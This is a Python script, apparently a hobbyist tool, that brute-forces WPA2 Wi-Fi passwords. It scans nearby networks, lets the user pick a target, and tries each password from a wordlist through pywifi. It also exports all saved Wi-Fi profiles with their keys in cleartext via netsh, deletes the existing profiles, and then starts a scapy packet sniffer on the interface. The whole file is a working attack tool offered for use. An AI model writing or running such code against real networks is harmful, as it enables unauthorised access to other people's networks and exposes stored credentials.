import time
import pywifi
import threading
import atexit
import subprocess
import os
from pywifi import const, Profile
from scapy.all import sniff, Packet, Raw


RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'

os.system('cls' if os.name == 'nt' else 'clear')

print("\n-------------------------------------------------------------------------------------------------------------------------------")
print("■■             ■■  ■■■■■■■  ■■         ■■■■■■    ■■■■■        ■■■   ■■■      ■■■■■■■")
print(" ■■           ■■   ■■       ■■        ■■       ■■     ■■     ■■ ■■ ■■ ■■     ■■     ")
print("  ■■   ■■■   ■■    ■■■■■■■  ■■       ■■        ■■     ■■    ■■   ■■■   ■■    ■■■■■■■")
print("   ■■ ■■ ■■ ■■     ■■       ■■        ■■       ■■     ■■   ■■           ■■   ■■     ")
print("    ■■■   ■■■      ■■■■■■■  ■■■■■■■    ■■■■■■    ■■■■■    ■■             ■■  ■■■■■■■")
print("")
print("■■■■■■■■    ■■■■■")
print("   ■■     ■■     ■■")
print("   ■■     ■■     ■■")
print("   ■■     ■■     ■■")
print("   ■■       ■■■■■")
print("")
print("■■■■■■     ■■■■■■■  ■■■■■■■  ■■■■■■  ")
print("■■   ■■    ■■       ■■       ■■   ■■")
print("■■    ■■   ■■■■■■■  ■■■■■■■  ■■■■■■  ")
print("■■   ■■    ■■       ■■       ■■      ")
print("■■■■■■     ■■■■■■■  ■■■■■■■  ■■      ")
print("                                   ■■■■■   ■■■■■■■      ■■■■      ■■■■■■      ■■■■■■  ■■    ■■  ■■■■■■■  ■■■■■■")
print("                                  ■■       ■■          ■■  ■■     ■■   ■■    ■■       ■■    ■■  ■■       ■■   ■■")
print("                                   ■■■■■   ■■■■■■■    ■■■■■■■■    ■■■■■■    ■■        ■■■■■■■■  ■■■■■■■  ■■■■■■")
print("                                       ■■  ■■        ■■      ■■   ■■   ■■    ■■       ■■    ■■  ■■       ■■   ■■")
print("                                   ■■■■■   ■■■■■■■  ■■        ■■  ■■    ■■    ■■■■■■  ■■    ■■  ■■■■■■■  ■■    ■■")
print(BLUE + "")
print("■■             ■■  ■■  ■■■■■■■  ■■")
print(" ■■           ■■       ■■       ")
print("  ■■   ■■■   ■■    ■■  ■■■■■■■  ■■")
print("   ■■ ■■ ■■ ■■     ■■  ■■       ■■")
print("    ■■■   ■■■      ■■  ■■       ■■" + RESET)
print("\n-------------------------------------------------------------------------------------------------------------------------------")
print(GREEN + "Maker : Sigma")
print("Github : https://github.com/ermwhatesigma" + RESET)
print(BLUE + "\nThis is the wifi bruteforcer. It tries all the passwords with the password file provided" + RESET)
print(RED + "**Warning** this script forgets all the saved passwords. But it saves them in the same folder as the script as the name and wifi name.xml file so you have to rewrite all the passwords\n" + RESET)

def scan_networks(wifi):
    wifi.scan()
    time.sleep(2)
    return wifi.scan_results()

def save_network_profiles():
    subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], check=True)

def restore_network_profiles():
    subprocess.run(["netsh", "wlan", "add", "profile", "filename=*.xml"], check=True)

def connect_to_network(wifi, ssid, password):
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    wifi.remove_all_network_profiles()
    wifi.add_network_profile(profile)

    wifi.connect(profile)
    time.sleep(5)

    if wifi.status() == const.IFACE_CONNECTED:
        print(GREEN + f"Connected to {ssid} with password: {password}" + RESET)
        return True
    else:
        print(f"Failed to connect to {ssid} with password: {password}")
        return False

def read_passwords(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def brute_force_wifi(passwords, ssid):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    try:
        for password in passwords:
            if connect_to_network(iface, ssid, password):
                break
    finally:
        restore_network_profiles()

def capture_packets(interface):
    print(f"Starting packet capture on interface {interface}")
    sniff(iface=interface, prn=lambda pkt: pkt.show(), store=0)

def select_network():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    scan_results = scan_networks(iface)
    print("Available WiFi networks:")
    for idx, network in enumerate(scan_results):
        print(f"{idx}: {network.ssid}")

    choice = int(input("Enter the number of the network to brute-force: "))
    return scan_results[choice].ssid

def cleanup():
    restore_network_profiles()

atexit.register(cleanup)

def main():
    password_file = input("Enter the name of the password file (default: passwords.txt): ")
    passwords = read_passwords(password_file)

    save_network_profiles()

    ssid = select_network()
    brute_force_wifi(passwords, ssid)

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    capture_thread = threading.Thread(target=capture_packets, args=(iface.name(),))
    capture_thread.start()

if __name__ == "__main__":
    main()
    input("Press any key to clear screen...")
    os.system('cls' if os.name == 'nt' else 'clear')